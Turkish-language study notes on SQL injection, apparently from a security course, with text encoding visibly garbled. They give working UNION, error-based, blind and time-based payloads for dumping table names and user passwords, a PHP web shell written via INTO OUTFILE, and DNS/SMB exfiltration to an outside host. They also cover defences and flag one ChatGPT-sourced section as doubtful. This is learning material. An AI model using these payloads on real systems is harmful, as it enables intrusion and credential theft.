# 0x01 | SQL Injection

```python
	                 SQLi Time Based Payloadlar Ä°le Tespit Edilir!
	                                 '-sleep(5)-'
	                      MySQL/MariaDB	      SLEEP(5)
												MSSQL	              WAITFOR DELAY '0:0:5'
												PostgreSQL	        pg_sleep(5)
												Oracle	            DBMS_LOCK.SLEEP(5)
												SQLite              randomblob(1000000000);
												
									 ',#,--," BU YAPILARI DA KULLANIRSIN TESPÄ°T Ä°Ã‡Ä°N
```

## Gerekli Ã–n Bilgiler

SQLi

SaldÄ±rganÄ±n yazdÄ±ÄŸÄ±nÄ±z web uygulamasÄ±nÄ± kullanarak veritabanÄ±nda kendi sql sorgularÄ±nÄ± Ã§alÄ±ÅŸtÄ±rabilmesi.

Genelde KRÄ°TÄ°K bir aÃ§Ä±ktÄ±r.

```sql
/etc/init.d/mysql start => mysql i baÅŸlat
mysql -u root -p => root olarak mysql'e baÄŸlanma isteÄŸi attÄ±n -u user -p password
```

SELECT 1; SONUCU 1â€™DÄ°R.

![image.png](attachment:d0764579-25a9-4ced-a9e5-2e11db4e3723:image.png)

SELECT 2-1; 2-1 Ä°N SONUCU 1â€™dir

Yani VeritabanÄ± burada Ã‡Ä±kartma Ä°ÅŸlemini GerÃ§ekleÅŸtirebiliyor.

![image.png](attachment:c3b96ae8-e161-4eba-927d-fcf86607a64e:image.png)

SELECT 2+1; Sonucu 3â€™tÃ¼r 

VeritabanÄ±n kendisi toplama iÅŸlemi yapabildiÄŸini Ã¶ÄŸrendik.

![image.png](attachment:f176bf56-78c3-4697-8d5a-ee1cd7ebdde5:image.png)

SELECT â€˜2-1â€™; Sonucu 2-1â€™dir 

â€˜â€™ Ä°Ã§inde yazÄ±lan ifade String deÄŸer dÃ¶ndÃ¼rÃ¼r iÃ§inde iÅŸlem olsa bile

![image.png](attachment:794cfbdb-b6bd-446e-88b3-6e790aa5e1a2:image.png)

SELECT â€˜2â€™-â€™1â€™; Sonucu 1;

String ifade inteagerâ€™a cast edildi ve Ã§Ä±karma iÅŸlemi yapÄ±ldÄ±.

![image.png](attachment:35c7f367-371e-4383-8d67-783bda5943a5:image.png)

SELECT â€˜2â€™+â€™1â€™;  Sonucu 3;

String ifade int cast edildi  â€˜â€™ iÃ§erisinde sonra toplama iÅŸlemi yapÄ±ldÄ±

![image.png](attachment:7fd7fc3d-3627-4699-bd7b-88c53ed0da9c:image.png)

SELECT â€˜2â€™+â€™aâ€™; Sonucu 2;

a ifadesini intâ€™e cast edemediÄŸi iÃ§in = 0 dedi 2+0 = 2

![image.png](attachment:14b93d5d-b8b4-44e3-9283-3d4d6241cf06:image.png)

SELECT â€˜bâ€™+â€™aâ€™ ; Sonucu 0

ifadeler intâ€™e cast edilemediÄŸindne = 0

![image.png](attachment:eb373dfd-ed4f-4962-97e8-db110b173066:image.png)

SELECT â€˜2â€™ â€˜1â€™; Sonucu 21

Concatiation iÅŸlemi yapÄ±lÄ±r BirleÅŸtirme  

![image.png](attachment:ea8213ee-6da5-4bb4-84d9-6de3c9f2c1ec:image.png)

SELECT â€˜2â€™ â€˜1â€™ â€˜Aâ€™; 21A

Concant iÅŸlemi yapÄ±lÄ±r.

![image.png](attachment:41661e11-1904-41a6-82dc-0cfe24049424:image.png)

SELECT â€˜2â€™ â€˜1â€™ â€˜Aâ€™-1; SonuÃ§ :CONCAT(21A)-1 â‡’ 21-1 = 20

![image.png](attachment:01882ae7-136f-4455-be72-1904dcfc1bed:image.png)

```sql
=> Neden 210 deÄŸil?
'2' '1' 'A' yan yana yazÄ±nca Concat('2','1','A') = '21A'
A burada sadece metin, 0 sayÄ±sal deÄŸeri yok.
MySQL '21A'â€™yi sayÄ±ya Ã§evirince sadece baÅŸtaki 21 okunuyor, A yoksayÄ±lÄ±yor.
21 - 1 => 20
```

SELECT 2^1; 3

![image.png](attachment:1332b2cf-6e09-4078-a80a-4312db5f3419:image.png)

^ xor operandÄ±dÄ±r.

2^1 sql_yacc.yy / [item.cmpfun.cc](http://item.cmpfun.cc) gibi parse rule da ve opreator handlerâ€™da bunlar iÅŸlenir mysql serverda derlendi ve Ã§alÄ±ÅŸtÄ±

Her database engine de ^ xor operandÄ± olmak zorunda deÄŸildir 

â‡’ Mysql de ^bitwise XOR

â‡’ PostgreSQL # bitwise XOR ^exponantâ€™dir (Ã¼st)

```sql
												XOR nasÄ±l Ã§alÄ±ÅŸÄ±r
AynÄ± bitler varsa â†’ 0
FarklÄ± bitler varsa â†’ 1

2: 10 (binary)
1: 01 (binary)
--------------
	 11 (binary)
XOR sonucu: 11 = 3
```

SELECT 2^2; 0

![image.png](attachment:e1a03108-fb09-46d7-b738-537004e58b08:image.png)

SELECT !1; 0

NOT komutu

![image.png](attachment:3e6ca1e3-27b0-42f0-b2ae-ae10e1a1eb71:image.png)

SELECT ~1;

![image.png](attachment:08249042-322d-451e-8f41-1e87a240b4f8:image.png)

INT_MAX verir

![image.png](attachment:359d23a4-e655-4ef8-8f5c-3cb85df7b72f:image.png)

ORACLE da bÃ¶yleymiÅŸ

---

Database yaratÄ±p deneme yapÄ±caz

```sql
CREATE database test;
use test;
CREATE TABLE users(
 id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
 firstname VARCHAR(30) NOT NULL,
 lastname VARCHAR(30) NOT NULL
);
```

```sql
INSERT INTO users(firstname,lastname) VALUEs ('mehmet','ince');
INSERT INTO users(firstname,lastname) VALUEs ('mehmet ','ince');
INSERT INTO users(firstname,lastname) VALUEs ('mehmet  ','ince');
INSERT INTO users(firstname,lastname) VALUEs ('mehmet   ','ince');
INSERT INTO users(firstname,lastname) VALUEs ('mehmet    ','ince');

SELECT * FROM users;
```

![image.png](attachment:f9091f3e-473f-4bde-ad22-7df541b01e54:image.png)

```sql
SELECT * FROM users WHERE firstname = 'mehmet';
```

![image.png](attachment:f9091f3e-473f-4bde-ad22-7df541b01e54:image.png)

Beklenti: Ä°lk satÄ±rdaki mehmetin gelmesi ama hepsi geliyor

SELECT defaultâ€™da dÃ¶ndÃ¼ÄŸÃ¼ veri Ã¼stÃ¼nde trim yapmazken 

Veri araken trim ( str.strip() )yapar!

```sql
----- EKSTRA NOT BUNU BEN EKLÄ°YORUM! ----- CHATGPT ETKÄ°SÄ°
uygulama tarafÄ±nda username'e gelen verileri trimle her zaman
=> trim boÅŸluklu username kullanÄ±mÄ±nÄ± kÄ±sÄ±tlar

Unique username kullanÄ±mÄ± aynÄ± kullanÄ±cÄ±nÄ±n oluÅŸmasÄ±nÄ± engeller
bunda hata kontrolÃ¼nde bu username kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶stermen lazÄ±m
=> Bu saldÄ±rgana bu username in var olduÄŸunu gÃ¶sterir ama problemi Ã§Ã¶zer

=> â€œÅifremi unuttumâ€ iÅŸleminde tam eÅŸleÅŸme yap
SELECT * FROM users WHERE BINARY username = ?; gibi => Exatc match olur

Bu bilgiler Chatgpt'den alÄ±ndÄ±! sÄ±rf merakÄ±mÄ±n sonucu olarak ekledim!
Bu kÄ±sÄ±m iÃ§in Bilgilerin gerÃ§ekliÄŸinden ÅŸÃ¼phe edin!
-----------------------------------------------------------------
```

```sql
	!!!!!  BU NEYE SEBEP OLUR ?
Bir kullanÄ±cÄ± 'admin ' kullanÄ±cÄ± yaratÄ±rsa ve
Åifre DeÄŸiÅŸtir / Åifremi Unuttum yaparsa
Sistem TÃ¼m 'admin' ile baÅŸlayan kullanÄ±cÄ±larÄ±n ÅŸifresini deÄŸiÅŸtiri-
-lebilmesine sebebiyet verir!!!!!
```

```sql
	!!!!  NASIL KORUNULUR BUNDAN ?
++ EXATC MATCH AÃ‡ILINILIRSA 
++ APPLICATION "INPUT VALLIDATION" YAPILIRSA BU PROBLEMÄ°N Ã–NÃœNE 
GEÃ‡Ä°LEBÄ°LÄ°RMÄ°Å
```

                                             HEPSÄ° AYNI SONUCU DÃ–NDÃœRÃœR

```sql
SELECT * FROM haberler WHERE id = 1 and 1=1
SELECT * FROM haberler WHERE id = 1 and (SELECT 1)=1
SELECT * FROM haberler WHERE id = 1 

2. YAZDIÄIN SANA SORGU YAZABÄ°LMENE OLANAK SAÄLIYOR EKSTRA BÄ°LGÄ° Ã‡EKMEK Ä°Ã‡Ä°N
```

---

## UNION SQLi

```sql
Web Sitesinin Adresi: www.x.com/?id=1
arkada dÃ¶nene iÅŸlem
SELECT * FROM haberler WHERE id = 1

DÃ–NEN CEVAP
<html>
	MDISEC 
</html>

-----------------------
Web Sitesinin Adresi: www.x.com/?id=2
arkada dÃ¶nene iÅŸlem
SELECT * FROM haberler WHERE id = 2

DÃ–NEN CEVAP
<html>
	LINUZZ
</html>

=======================================
Adrese giden Request sonucu tetiklenen backend
Pentest yaparken bu backende sahip deÄŸiliz!.
Biz sadece yukarÄ±dan get isteÄŸini yollayabiliyoruz

id = request.get('id')

query= "SELECT * FROM haberler WHERE id ="+id

result = db.execute(query)

if result.size() > 0: # Buradan VeritabanÄ±nda veri dÃ¶ndÃ¼ÄŸÃ¼nÃ¼ anladÄ±k
	for i in result:
		print(i.title)
	else:
		print("haber yok!")
```

```sql
ANLAMAMIZ GEREKEN KISIM BURAYA GELÄ°YOR Ä°ÅTE TÃœM SÃœREÃ‡ ÅU

Web Sitesinin Adresi: www.x.com/?id=2-1
arkada dÃ¶nene iÅŸlem
SELECT * FROM haberler WHERE id = 2-1

DÃ–NEN CEVAP
<html>
	MDISEC
</html>

ulaÅŸÄ±rsak id = 1 olan kullanÄ±cÄ±ya ulaÅŸtÄ±k!!!!
VeritabanÄ±nda Ã‡Ä±kartma Ä°ÅŸlemi Yapabildin Bu Bir 
Arka Planda YazÄ±lÄ±mcÄ±nÄ±n DÃ¼ÅŸÃ¼nmediÄŸi Bir Zaafiyeti Buldun!!!
```

TÃ¼m vulnâ€™larÄ±n 2 tane adÄ±mÄ± vardÄ±r

1. Zafiyetin Tespiti
2. Zafiyetin SÃ¶mÃ¼rÃ¼lmesi

Expected Behaviorâ€™u bul 2â€™si 

```sql
Expected Behavior seÃ§ 1 tane Initial point'in olmalÄ± ve bir ÅŸekilde
o initial point'e ulaÅŸabiliyorsan tebrik ederim Zaafiyet'i buldun!

SELECT * FROM haberler WHERE id = 1 â‡’ MDISEC 
SELECT * FROM haberler WHERE id = 2 â‡’ LUNIZZ
SELECT * FROM haberler WHERE id = 2-1 â‡’ MDISEC buluyorsak
```

2-1 yerine bir subqueryâ€™ de yazabilirsin 

id = (SELECT â€¦ )

```sql
SELECT * FROM haberler WHERE id = 1 
UNION 
SELECT * FROM X
```

Xâ€™E ne yazÄ±cam abi?

X YERÄ°NE ABÄ° biÅŸi yazmicaksÄ±n

UNION SELECT 1 yapÄ±caksÄ±n ve Ã§alÄ±ÅŸÄ±cak

UNIONâ€™Ä±n limitasyonu var 1 Ã¶nceki sorguyla aynÄ± coloumn sahip olmalÄ±

```sql
www.ex.com/listproducts.php?cat=2
endpoint listproducts ise veritabanÄ±ndaki products'lar iÃ§indeki bir
table a select sorgusu Ã§alÄ±ÅŸÄ±cak ve bu select sorgusunu bilmesek de
category coloumn'una bir where clause gelmeli products ile category
arasÄ±nda M to M relation olur 
select sorgusunda bir join var join category tablosuna gidip
category tablosundaki id'ye tekabÃ¼l edicek ve buradan limitasyon
yapabil

cat=1 ile cat=2-1 aynÄ± sayfa ise evet burada bir sqli aÃ§Ä±ÄŸÄ± var
```

```sql
SELECT * FROM haberler WHERE id = 1 
UNION 
SELECT 1
```

### HATA Ä°LE KARÅILAÅMA

![image.png](attachment:d5d30bc1-7f14-4760-aeab-9cd640b8db06:image.png)

Hata Coloumn SayÄ±larÄ±nÄ±n FarklÄ± olduÄŸunu sÃ¶ylÃ¼yor Bu hata sayesinde 

select 1 referans noktana dÃ¶ndÃ¼rtmedi seni

```sql
id = request.get('id')

query= "SELECT * FROM haberler WHERE id ="+id

try # Bu kÄ±smÄ± eklersen bu hata da kaybolur 
	result = db.execute(query) #
except Exception as e: #
	pass #

if result.size() > 0: # Buradan VeritabanÄ±nda veri dÃ¶ndÃ¼ÄŸÃ¼nÃ¼ anladÄ±k
	for i in result:
		print(i.title)
	else:
		print("haber yok!")

```

### Ä°lk Dikkat Etmen Gereken Åey SQLiâ€™Ä±n var olduÄŸunu keÅŸfetmen lazÄ±m! Sonra 
DiÄŸer YÃ¶ntemleri Kullanman LazÄ±m

```sql
SELECT * FROM haberler WHERE id = 1 
UNION 
SELECT 1,2,3,4,5,6,... referans noktanÄ± bulana kdar ekle
```

![image.png](attachment:b37a25fc-8034-438e-8640-081a51c686f9:image.png)

```sql
cat=1 UNION SELECT 1,2,3,4,5,6,7,8,version(),10,11
7 2 9 ifadeleri Sistemdeki queryden gelen select iÃ§erikleri
Burada karÅŸÄ± taraftan bilgileri elde edebileceÄŸin yer oluyor
TÃ¼m Helper Function'lar kullanÄ±mÄ±na hazÄ±r oluyor
System Information Functions bilgilerini Ã§alabilme ÅŸansÄ± tanÄ±yor bu SQLi,
Information Functions, System Functions, Metada Functions
version(),
```

```sql
cat=-999999999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11
-999999999 bÃ¶yle bir auto increment id'li kayÄ±t yoktur 
UNION'dan Ã¶nceki select in dÃ¶nmesini saÄŸlayarak sadece kendi select sorgunun
cevaplarÄ±na ulaÅŸabilmek iÃ§in yaptÄ±k
```

![image.png](attachment:2d9dd944-c6a5-4c9c-92a1-c1ceb85e215b:image.png)

Her Ä°liÅŸkisel VeritabanÄ± sistemindeo sistemdeki TABLE, COLOUMN Ä°SÄ°MLERÄ°NÄ° BARINDIRAN 

SÄ°STEM TABLOSU VAR bunun Ã¼stÃ¼nden â€œmysql list table of databaseâ€

Information Schemasâ€™dan tablo isimlerini Ã§ekersen eriÅŸebilirsin

```sql
acuart => DB
cat=-99999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 FROM acuart.tables 

cat=-99999 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables 
WHERE table_schema = database();
```

![image.png](attachment:ecafbd9a-ec7d-413e-b9bc-6eedff006302:image.png)

usersâ€™Ä±n coloumnâ€™larÄ±nÄ± Ã§ekmek istediÄŸinde

```sql
cat=-99999 UNION SELECT 1,2,3,4,5,6,colomn_name,8,9,10,11 FROM information_schema.columns
WHERE table_name = 'users';
```

![image.png](attachment:b7ab85f7-cad2-40cc-a8ac-f7b4547c9f7e:image.png)

```sql
cat=-99999 UNION SELECT 1,2,3,4,5,6,uname,8,9,10,11 FROM users;

uname yerine pass de yazabilirsin ya da daha iyisi

concat(uname,':K.AdÄ±:',pass,':Sifre:')
Ã¶rnekteki concat(uname,':MDISEC:'pass)
```

![image.png](attachment:e51a03bd-7f2b-4d4a-a094-19ce198d0dd3:image.png)

SQLMAP bu ÅŸekilde information schemadan â‡’ db â‡’ table â‡’ table â‡’ DATAâ€™ya ulaÅŸÄ±yoz

### SQLMAP Ä°ÅTE BU ÅEKÄ°LDE Ã‡ALIÅIYOR UNION BASED SQLi

## ERROR BASED SQLi

try exceptionlar koyulmadÄ±ÄŸÄ± zaman

â‡’ VeritabanÄ±nda bir hata oluÅŸtuÄŸu zaman sitede hata gÃ¶stermeye sebep olur

```sql
id = request.get('id')

query= "SELECT * FROM haberler WHERE id ="+id

# try # Hata kÄ±smÄ± kontrol edilmeseydi
	result = db.execute(query) 
#except Exception as e: #
	#pass 

if result.size() > 0: # Buradan VeritabanÄ±nda veri dÃ¶ndÃ¼ÄŸÃ¼nÃ¼ anladÄ±k
	for i in result:
		print(i.title)
	else:
		print("haber yok!")

```

![image.png](attachment:08127cd0-43ff-4151-9cd0-8762001a1c8a:image.png)

```sql
!! Burada Bir YÃ¶ntem Var Bilgi Toplamak AdÄ±na !!

SQL'de kullanÄ±labilir bir fonks. parametre olarak xml alarak parametre dÃ¶ndÃ¼rÃ¼r
=> extractValue(rand(), Veri_Ã‡ekmen_Ä°Ã§in_Gerekli_Helper)

Hata mesajÄ±ndaki aÃ§Ä±ÄŸÄ± kullanarak kendimize db hakkÄ±nda bilgi toplama fÄ±rsatÄ± sunuyor
```

```sql
Sorgu iÃ§erisindeki String bir deÄŸeri hatalÄ± bir deÄŸer dÃ¶ndÃ¼rebilirsen
=> SubQuery Kullanabilirsin!
concat daha Ã§ok veri Ã§ekmene yarar

extractvalue(rand(), concat(1, SELECT(database())));
```

OluÅŸan yapÄ± ÅŸu olucak

```sql
Web Sitesinin Adresi: www.x.com/?id=extractvalue(rand(), concat(1, SELECT(database())));
Veya
Web Sitesinin Adresi: www.x.com/?id=1 and 1=extractvalue(rand(), concat(1, SELECT(database())));
Arkada DÃ¶nen Ä°ÅŸlem
SELECT * FROM haberler WHERE id =extractvalue(rand(), concat(1, SELECT(database())));

DÃ–NEN CEVAP
<html>
	Hata Ä°Ã§inde XPATH ile DB ismi
</html>

=============
```

![image.png](attachment:609a7773-49db-4587-9b65-58bff54a7ad6:image.png)

=====

```sql
Web Sitesinin Adresi: www.x.com/?id= 1' and '1'='1 #$input olucak

SELECT * FROM haberler 
WHERE id = '$input' # '1' and '1'='1' gibi olucak id = 1 ve 1=1 durumuna bakar 1=1 olduÄŸundan id=1 dÃ¶ner
#
DÃ–NEN CEVAP
<html>
	MDISEC
</html>

# DELETE * FROM hab WHERE  or kullansaydÄ±n veriyi patlatÄ±rdÄ±n
# NE YAPTIÄINA EMÄ°N DEÄÄ°LSEN OR KULLANMA
# AUTH BYPASS 
```

```sql
Web Sitesinin Adresi: www.x.com/?id= 1' and 1=1 #

SELECT * FROM haberler 
WHERE id = '1' and 1=1 #' 

WAF bypass iÃ§in id = 2^1 dene id =3 olan kiÅŸiye ulaÅŸabiliyorsan ++
```

### IN SORGULARINDAN KAÃ‡INMAK Ä°Ã‡Ä°N

```sql
Web Sitesinin Adresi: www.x.com/?id=1) UNION SELECT #

SELECT * FROM haberler 
WHERE id IN (1) UNION SELECT #) #HATA MESAJINI ALMAMAK Ä°Ã‡Ä°N YAZIYOSUN
```

## EN AZ TEST Ä°LE SQLi BULMA

# BOOLEAN-BASED SQLi â€”â€” BLIND SQLi

```sql
SELECT * FROM haberler WHERE id = '1''';
1 = ' olanÄ± aratÄ±yorsun
ama VeritabanÄ± bu inteager Ä± birleÅŸtiriyor
True False oynayarak da bulabilirmiÅŸsin. 
```

```sql
Backend kodu bÃ¶yle dÃ¼zeltirsek

id = request.get('id')

query= "SELECT * FROM haberler WHERE id ="+id

result = db.execute(query) 

#Hataya gÃ¶re bilgi edinicez
if result.size() > 0: 
	print("haber var")
else:
	print("haber yok!")
```

```sql
www.x.com/?id=1
SELECT * FROM haberler WHERE id= 1

<html>
	Haber Var
</html>
===

www.x.com/?id=1
SELECT * FROM haberler WHERE id= 2-1

<html>
	Haber Var
</html>

# ArtÄ±k veri yok | Yani Uygulama Sorgunun Sonucunu Sana Vermicek
# Peki buradan nasÄ±l veri Ã§Ä±karÄ±caksÄ±n?
```

Bu noktada artÄ±k True False oynamak zorunda kalÄ±yorsun 

```sql
www.x.com/?id=1
SELECT * FROM haberler WHERE id= 1 and (SELECT 1)=2 # 1 = deÄŸildir 2

<html>
	Haber Yok
</html>
===
```

<aside>
ğŸ’¡

HELPER FUNC

SUBSTRING(

STRING Ä°FADE #â€™MEHMETâ€™

,HANGÄ° KARAKTERDEN

,HANGÄ° KARAKTERE KADAR KESÄ°CEK

); â‡’ M dÃ¶ner

</aside>

```sql
www.x.com/?id=1
SELECT * FROM haberler WHERE 
id= 1 and SUBSTRING(
	(SELECT table_name FROM information_schema.tables 
	WHERE table_schema = database() LIMIT 1,1,) #users dÃ¶ndÃ¼ÄŸÃ¼ varsayalÄ±m ARRAY DÃ–NMEMELÄ°
	,1
	,1 
)='a' # ifade 'u' olduÄŸunu bulanana kadar haber yok gÃ¶rÃ¼rsÃ¼n

<html>
	Haber Yok
</html>
===

www.x.com/?id=1
SELECT * FROM haberler WHERE 
id= 1 and SUBSTRING(
	(SELECT table_name FROM information_schema.tables 
	WHERE table_schema = database() LIMIT 1,1,) #users dÃ¶ndÃ¼ÄŸÃ¼ varsayalÄ±m ARRAY DÃ–NMEMELÄ°
	,2
	,1 
)='s' # ifadede 2.harfin 's' olduÄŸunu bulanana kadar haber yok gÃ¶rÃ¼rsÃ¼n

bu iÅŸlemi her harf iÃ§in yapÄ±nca table name i bulmuÅŸ olucaksÄ±n bunun iÃ§in bir for dÃ¶ngÃ¼lÃ¼
kod yazsan karÅŸÄ±daki db table iÃ§eriklerini Ã§Ä±karmÄ±ÅŸ olucaksÄ±n
														!!! sqlmap' de bunu yapÄ±yor'. !!!

SELECT * FROM haberler WHERE 
id= 1 and SUBSTRING(
	(SELECT table_name FROM information_schema.tables 
	WHERE table_schema = database() LIMIT 2,1,) #password dÃ¶ndÃ¼ÄŸÃ¼ varsayalÄ±m ARRAY DÃ–NMEMELÄ°
	,1
	,1 
)='p' # ifadede 2.harfin 'p' olduÄŸunu bulanana kadar haber yok gÃ¶rÃ¼rsÃ¼n

2. table iÃ§in arama yapÄ±yor olucaksÄ±n
```

<aside>
ğŸ’¡

Bu YapÄ±caÄŸÄ±n Arama Ä°ÅŸlemi Ã‡ok Uzun SÃ¼rÃ¼cek a-z + A-Z + 0-9 _-~ Ã¶zel karakterler var 
1 harf iÃ§in 70 deneme yapmak zorunda kalÄ±yorsun bunu Ã§Ã¶zmenin yolu da ÅŸu

SELECT * FROM haberler WHERE 
id= 1 and SUBSTRING(
	(SELECT table_name FROM information_schema.tables 
	WHERE table_schema = database() LIMIT 2,1,) #password dÃ¶ndÃ¼ÄŸÃ¼ varsayalÄ±m ARRAY DÃ–NMEMELÄ°
	,1
	,1 
)='p' #Senin iÃ§in Problem olan kÄ±sÄ±m burasÄ± YAVAÅLATAN YANÄ° onu aÅŸaÄŸÄ±da Ã§Ã¶zÃ¼yoruz

</aside>

```sql
query = SELECT * FROM haberler WHERE
id= 1 and ASCII(
  SUBSTRING(
    (SELECT table_name FROM information_schema.tables WHERE
    table_schema=database() LIMIT 1,1) #users
    ,1
    ,1
)
)>(32+129)/2=80

# 117 80den bÃ¼yÃ¼k mÃ¼ ? evet = haber var
# artÄ±k 80den bÃ¼yÃ¼k bir deÄŸer olduÄŸunu anlÄ±yoruz.
# Bu ÅŸekilde binary search mantÄ±ÄŸÄ± ile
# aradÄ±ÄŸÄ±mÄ±z karakteri bulmuÅŸ oluyoruz.

<html>
	HABER VAR
</html>
```

Arama YapÄ±caÄŸÄ±mÄ±z AralÄ±k BurasÄ± 

![image.png](attachment:e08cd97a-ec99-40af-b2c2-d616029a1d54:image.png)

```sql
query = SELECT * FROM haberler WHERE
id= 1 and ASCII(
  SUBSTRING(
    (SELECT table_name FROM information_schema.tables WHERE
    table_schema=database() LIMIT 1,1) #users
    ,1
    ,1
)
)>80 #users Ä± buldun bi ÅŸekil

BURADA DA USERS Ä°Ã‡Ä°NDEKÄ° KULLANICIYI BULUYORSUN VERÄ° Ã‡EKMEK Ä°Ã‡Ä°N

query = SELECT * FROM haberler WHERE
id= 1 and ASCII(
  SUBSTRING(
    (SELECT column_name FROM information_schema.columns WHERE
    table_name='users' LIMIT 1,1) #Usernamei arÄ±yon
    ,1
    ,1
)
)>(32+129)/2=80
```

```sql
Backend kodu bÃ¶yle dÃ¼zeltirsek

id = request.get('id')

query= "SELECT * FROM haberler WHERE id ="+id

result = db.execute(query) 

#Hataya gÃ¶re bilgi edinicez

print("MERHABA :)")

# Veri tabanÄ±nda aradÄ±ÄŸÄ±nÄ± bulsan da bulmasan da hep aynÄ± ÅŸey karÅŸÄ±na Ã§Ä±kÄ±cak
# Time Based SQLi kullanÄ±rsÄ±n burda Sistemi bir sÃ¼reliÄŸine dondurabiliyorsan
# Ve bu senin istediÄŸin ÅŸeyi bulduÄŸun durumda oluyorsa tebrikler sistemde Ã¶yle bir
# veri var ve sen buna ulaÅŸabiliyorsun.
```

<aside>
ğŸ’¡

IF(CONDITION, #1=1

TRUE Ä°SE, #1

FALSE Ä°SE #0

);

</aside>

```sql
	SELECT * FROM users 
	WHERE id = IF(SUBSTRING(SELECT('ahmet'),1,1)='a',sleep(5),0)
	
	SELECT * FROM users 
	WHERE id = IF(1=1,sleep(5),0)
	=> her entry iÃ§in bekeleme sÃ¼resi x 5 kaynaklÄ± bu kadar zaman alÄ±yor dÃ¶nÃ¼ÅŸÃ¼
	
	where id = 1 and 1 = IF(1=1,SLEEP(1),0);
	o zaman probleminin bir kÄ±smÄ±nÄ± aÅŸarson
	=> shortcut circuit yaptÄ±ÄŸÄ±ndan 1 kere entry bakÄ±p dÃ¶nÃ¼yor
```

![image.png](attachment:0167f909-dcc6-44e8-ad85-cf5e476ee7e1:image.png)

                                                 FotoÄŸraftaki yapÄ± %100 doÄŸru deÄŸildir!

Sleep(5) Sadece bu sql sorgusu iÃ§in sleep yapar resource tutuyor haricinde sql iÅŸlemlerine eÅŸ zamanlÄ±

devam ediyor

## OUT OF BAND SQLi

```sql
========================

id= request.get('id')

rabbitmq.pushTask('report_generate',id)

print("selam")
```

<aside>
ğŸ’¡

r57 veya c99 saldÄ±rÄ±larÄ± burda yapabiliyormuÅŸsun

SELECT â€˜<?= system(@$_GET['cmd']) ?>' INTO OUTFILE â€˜/var/www/html/c99.phpâ€™

INTO OUTFILE â‡’ Diske VERÄ° YAZAR

cat /var/www/html/c99.php bizim bu yazdÄ±ÄŸÄ±mÄ±z kod vardÄ±r

</aside>

### DATA EXFILTRATION VIA SQLi

```sql
SELECT 'mehmet' INTO OUTFILE '\\\hacker.mdisec.com/a';

Windows hacker.mdisec.com SAMBA baÄŸlantÄ±sÄ±yla 445 Domain i Ã§Ã¶zmeye Ã§alÄ±ÅŸÄ±r
Win OS DNS'te hacker.mdisec.com'u sorar 

SELECT 'mehmet' INTO OUTFILE '\\\'+(SELECT 'table_name (BURADA KENDI SQL KODUNU Ã‡ALIÅTIRIRSIN)' )+'.mdisec.com/a';
```

![image.png](attachment:abcc5dd6-5610-44cf-bea9-ca809869e6c0:image.png)

Engellemek Ä°Ã§in

DB Server Outbandâ€™lerini KÄ±sÄ±tla Localâ€™e izin ver 

```sql
DB Server â¡ï¸ Internet (BLOCK)
DB Server â¡ï¸ Local DNS resolver (ALLOW)
```

UNC pathâ€™leri kontrol et

### ORM OBJECT RELEATIONAL MAPPING

```python
class Haberler(Table):
	id = db.auth()
	
id = request.get('id')

Haberler.filter(id).get
# query = "SELECT * FROM haberler WHERE id = :id => YaptÄ±ÄŸÄ±n Potansiyel SQLi

db.execute(query)

print(selam)
```

â‡’ Komplike Sorgu Yapmaya Ã‡alÄ±ÅŸtÄ±ÄŸÄ±n Yerlerde

Reporting EkranlarÄ± - Centeral Stored Procedureâ€™lerde  â‡’ Mikro APIâ€™ler bunu engellemeye yÃ¶nelik

 

```python
class Haberler(Table):
	id = db.auth()
	
query = "SELECT * FROM haberler WHERE id = '1' => Hard parssing yapmak zorunda kalÄ±r 
sistem yavaÅŸlar| Hard parssing : 

SELECT * FROM haberler WHERE id = :id | Åeklinde olmasÄ± SQLi bir nebze azaltÄ±rmÄ±ÅŸ

db.execute(query,id)

print(selam)

# SQLi'Ä±n oluÅŸmasÄ±nÄ±n sebebi => Data nÄ±n data olarak kalmamasÄ± VeritabanÄ± Sorgu dÃ¶nÃ¼ÅŸmesi
```

### TÃœM Ä°ÅLEMLER LOGLANMALI
